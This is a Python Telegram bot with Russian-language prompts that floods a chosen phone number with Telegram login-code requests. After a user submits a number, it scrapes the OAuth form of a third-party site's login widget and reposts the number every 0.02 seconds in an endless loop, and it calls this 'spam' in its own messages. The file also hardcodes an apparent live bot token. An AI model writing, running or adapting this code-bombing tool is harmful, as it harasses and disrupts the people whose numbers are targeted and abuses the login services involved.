import asyncio
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from bs4 import BeautifulSoup

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер (например, +380963836766) — бот сам найдёт форму и отправит код.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return

    await update.message.reply_text(f"Запущено на {phone}. Парсим страницу и отправляем...")

    async def spam():
        count = 0
        base_url = "https://oauth.telegram.org/auth"
        params = {
            "bot_id": "1852523856",
            "origin": "https://cabinet.presscode.app",
            "embed": "1",
            "return_to": "https://cabinet.presscode.app/login"
        }
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    # 1. Загружаем страницу с формой
                    async with session.get(base_url, params=params) as resp:
                        html = await resp.text()
                    soup = BeautifulSoup(html, 'lxml')
                    form = soup.find('form')
                    if not form:
                        await context.bot.send_message(chat_id, "Форма не найдена, пробую прямой POST")
                        action = "/auth/send"
                        data = {'phone': phone}
                    else:
                        action = form.get('action')
                        if not action.startswith('http'):
                            action = base_url + action
                        data = {}
                        for inp in form.find_all('input'):
                            name = inp.get('name')
                            if name and inp.get('type') != 'submit':
                                data[name] = inp.get('value', '')
                        data['phone'] = phone

                    async with session.post(action, data=data) as resp:
                        status = resp.status
                        text = await resp.text()
                        count += 1
                        await context.bot.send_message(chat_id, f"#{count}: {status}, {text[:40]}")
                except Exception as e:
                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
                await asyncio.sleep(0.02)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
